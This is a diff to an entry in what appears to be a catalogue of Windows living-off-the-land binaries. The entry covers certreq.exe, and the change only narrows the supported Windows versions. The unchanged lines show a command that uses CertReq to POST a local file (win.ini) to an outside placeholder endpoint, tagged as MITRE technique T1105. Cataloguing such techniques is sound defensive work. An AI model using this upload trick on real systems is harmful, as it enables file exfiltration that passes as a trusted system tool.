@@ -10,14 +10,14 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows 10, Windows 11
   - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal
     Description: Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST
     Usecase: Upload
     Category: Upload
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\certreq.exe
   - Path: C:\Windows\SysWOW64\certreq.exe
